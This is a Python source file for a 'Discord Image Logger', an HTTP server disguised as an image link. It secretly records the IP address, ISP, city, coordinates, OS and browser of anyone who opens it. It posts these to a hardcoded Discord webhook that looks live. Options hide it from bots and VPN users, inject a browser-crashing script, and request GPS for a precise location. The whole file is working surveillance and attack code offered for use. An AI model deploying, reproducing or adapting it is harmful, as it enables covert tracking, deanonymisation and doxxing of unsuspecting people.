
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1335667587572432947/OUk616TFNWUOlLMNvwkRI9-7d4LoD5pXpzFTfSrTPe5e-GWpAwNWkCsug2djmJzKBJbG",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
